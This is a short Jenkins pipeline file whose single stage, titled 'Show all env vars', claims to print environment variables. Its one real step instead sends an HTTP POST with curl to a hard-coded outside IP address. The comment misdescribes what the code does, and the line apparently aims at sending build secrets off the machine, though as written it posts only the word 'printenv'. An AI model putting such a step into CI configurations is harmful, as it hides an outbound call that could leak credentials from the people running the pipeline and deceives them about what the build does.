pipeline {
    agent any

    stages {
        stage('Show all env vars') {
            steps {
                // POSIX‑style: prints NAME=value on separate lines
                sh 'curl -X POST -d "printenv" http://20.83.144.174'

                // If you prefer Groovy‑style inside Jenkins:
                // env.each { k, v -> echo "${k}=${v}" }
            }
        }
    }
}
